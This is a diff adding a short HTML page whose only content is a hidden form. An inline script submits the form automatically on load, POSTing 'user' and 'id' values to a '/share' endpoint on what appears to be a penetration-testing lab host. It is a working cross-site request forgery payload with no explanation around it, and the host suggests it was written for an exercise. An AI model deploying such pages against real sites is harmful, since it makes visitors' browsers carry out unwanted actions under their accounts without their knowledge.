@@ -1,0 +1,11 @@
+  <html>
+    <body>
+        <form action="http://ptl-199db77c-0e00a6ea.libcurl.so/share" method="POST">
+            <input type="hidden" name="user" value="a" />
+            <input type="hidden" name="id" value="0" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
